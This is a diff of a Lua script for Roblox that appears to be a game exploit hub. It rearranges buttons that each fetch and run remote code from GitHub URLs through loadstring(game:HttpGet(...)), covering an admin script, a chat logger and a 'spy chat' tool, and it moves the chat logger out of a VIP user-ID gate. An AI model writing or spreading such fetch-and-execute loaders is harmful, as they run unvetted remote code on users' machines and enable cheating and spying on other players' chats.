@@ -493,22 +493,24 @@ end)
 local Button = Section.NewButton("Inf Yeld",function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
-local Button = Section.NewButton("Strong Admin (broken)",function()
-_G.CustomUI = false
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v3.lua'),true))()
-end)
+
 local VIPPlayers = {
     [2236295191] = true,
     [202792190] = true,
     [12] = true
 }
 if VIPPlayers[game.Players.LocalPlayer.UserId] then
-local Button = Section.NewButton("Chat Logger",function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Syr0nix/Chatlogger/main/e'))()
-end)
-end
 local Button = Section.NewButton("Spy chat",function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/spy%20script'))()
+end)
+	local Button = Section.NewButton("Strong Admin (broken)",function()
+_G.CustomUI = false
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v3.lua'),true))()
+end)
+end
+
+local Button = Section.NewButton("Chat Logger",function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Syr0nix/Chatlogger/main/e'))()
 end)
 local Button = Section.NewButton("Teleport all",function()
 	for i,v in pairs(game.Players:GetChildren()) do
